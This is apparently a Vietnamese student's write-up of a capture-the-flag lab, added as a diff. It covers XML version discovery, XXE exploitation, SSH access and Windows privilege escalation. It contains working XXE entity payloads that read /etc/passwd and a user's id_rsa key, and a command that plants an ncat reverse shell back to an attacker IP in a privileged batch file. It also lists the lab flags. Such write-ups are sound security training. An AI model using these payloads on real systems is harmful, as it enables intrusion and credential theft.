@@ -482,4 +482,126 @@ export PATH=/tmp:$PATH
 ### Task 4: What XML version is used on the target?
 
 - Lần lượt kiểm tra nguồn trang của các mục nhưng không tìm thấy ghi chú version
--
+- Vậy nên ta thử `POST` một gói tin đăng nhập và dùng burp suite bắt lại nhưng vẫn không có gì đặc biệt:
+![1774141887369](image/Report/1774141887369.png)
+![1774142959272](image/Report/1774142959272.png)
+
+> Cả gói tin `POST` và gói tin `GET` sau đó đều không chứa version của XML
+
+- Tuy nhiên trang oder cũng có thể POST, em thử bắt gói tin POST ở tab `order` thì đã thu được version:
+![1774143104872](image/Report/1774143104872.png)
+
+> 1.0
+
+### Task 5: What does the XXE / XEE attack acronym stand for?
+
+![1774143214643](image/Report/1774143214643.png)
+
+> XML external entity
+
+### Task 6: What username can we find on the webpage's HTML code?
+
+- Lần lượt kiểm tra source của page, đến tab `order` thì tìm thấy:
+![1774143444028](image/Report/1774143444028.png)
+
+> Daniel
+
+### Task 7: What is the file located in the Log-Management folder on the target?
+
+- Dùng thử `gubuster` để quét các thư mục thông dụng nhưng không tìm được gì đặc biệt:
+![1774144691253](image/Report/1774144691253.png)
+- Ở task 4 ta đã biết dữ liệu được gửi với dạng XLM, gợi ý cho ta tấn công XXE
+- Gửi đi 1 gói tin order và dùng burp suite để bắt lại:
+![1774145168683](image/Report/1774145168683.png)
+![1774145195647](image/Report/1774145195647.png)
+- Thử đọc 1 tệp phổ biến trên hệ điều hành linux bằng cách chèn lệnh `<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>`:
+![1774146269016](image/Report/1774146269016.png)
+
+> Server không có tệp này, khả năng cao là window
+
+- Tuy nhiên giờ ta cần xác định hệ điều hành của server để chèn lệnh hợp lí, em dùng nmap để scan:
+![1774146943282](image/Report/1774146943282.png)
+
+> Đến đây đã xác nhận được hệ điều hành chạy window
+
+- Ở task 6 ta đã xác định được có user tên daniel nên thử chèn đoạn lệnh này vào `<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>` để tìm `rsa key` ở thư mục thường thấy ở win:
+![1774147151717](image/Report/1774147151717.png)
+
+> Đã tìm được key của user Daniel
+
+- Ta chép key ra file và dùng nó để kết nối với ssh của user Daniel: `ssh -i rsa_key daniel@10.129.95.192`
+![1774152963877](image/Report/1774152963877.png)
+
+> Đã đăng nhập được vào shell của Daniel
+
+- Kiểm tra các thư mục của tài khoản này:
+![1774153080506](image/Report/1774153080506.png)
+
+- Ta vô tình tìm được flag của task sau ở thư mục desktop:
+![1774153230438](image/Report/1774153230438.png)
+
+> Lấy luôn task sau khỏi phải tìm, flag là: 032d2fc8952a8c24e39c8f0ee9918ef7
+
+- Tuy nhiên ở thư mục hiện tại thì chưa tìm thấy thư mục `Log-Management`, thử tìm trong ổ `C`:
+![1774153556639](image/Report/1774153556639.png)
+
+> Đã tìm thấy: job.bat
+
+### Task 8: What executable is mentioned in the file mentioned before?
+
+- Kiểm tra nội dung file `job.bat` vừa tìm được:
+![1774153758798](image/Report/1774153758798.png)
+
+> wevtutil.exe
+
+### User flag?
+
+- Đã vô tình tìm được ở task 7
+
+> 032d2fc8952a8c24e39c8f0ee9918ef7
+
+### Root flag
+
+- Kiểm tra quyền của `job.bat` thì nó chạy được ở full quyền, nếu chèn lệnh vào đây thì nó sẽ chạy với quyền cao nhất:
+![1774154186884](image/Report/1774154186884.png)
+
+> Ý tưởng là dùng Netcat để tạo reverse shell
+
+- Mở port để chờ `ncat -lvnp 4444`
+- Thử `nc64.exe` từ GitHub về máy mục tiêu:
+![1774154743662](image/Report/1774154743662.png)
+
+> Có vẻ máy mục tiêu không ko có kết nối internet
+
+- Vậy cần mở 1 server để máy mục tiêu kết nối vào:
+![1774154961267](image/Report/1774154961267.png)
+
+- Giờ chỉ cần tải `ncat` lên máy mục tiêu:
+![1774155051609](image/Report/1774155051609.png)
+
+> Đã tải lên thành công
+
+- Giờ chèn lệnh vào `job.bat` để máy mục tiêu dùng ncat và kết nối vào cổng mà ta đã mở sẵn: `echo C:\Log-Management\ncat.exe -e cmd.exe 10.10.16.76 4444 > C:\Log-Management\job.bat`
+- Tuy nhiên sau một lúc không thấy shell thì em mở `dob.bat` lên kiểm tra thì thấy lệnh chưa được chèn:
+![1774155487486](image/Report/1774155487486.png)
+- Em xóa hẳn file đó để tạo file mới:
+
+```cmd
+del job.bat
+echo C:\Log-Management\ncat.exe -e cmd.exe 10.10.16.76 4444 > job.bat
+```
+
+- Không hiểu sao với ncat thì không chiếm được shell mặc dù bên server đã thật sự có tiến trình `ncat`, vậy nên em đổi qua dùng `nc64.exe` thì đã chiếm được:
+
+![1774161560925](image/Report/1774161560925.png)
+
+- Việc còn lại chỉ là đi tìm root flag:
+![1774161700658](image/Report/1774161700658.png)
+
+> f574a3e7650cebd8c39784299cb570f8
+
+### Tổng kết kết quả
+
+![1774161750904](image/Report/1774161750904.png)
+![1774161761911](image/Report/1774161761911.png)
+![1774161774729](image/Report/1774161774729.png)
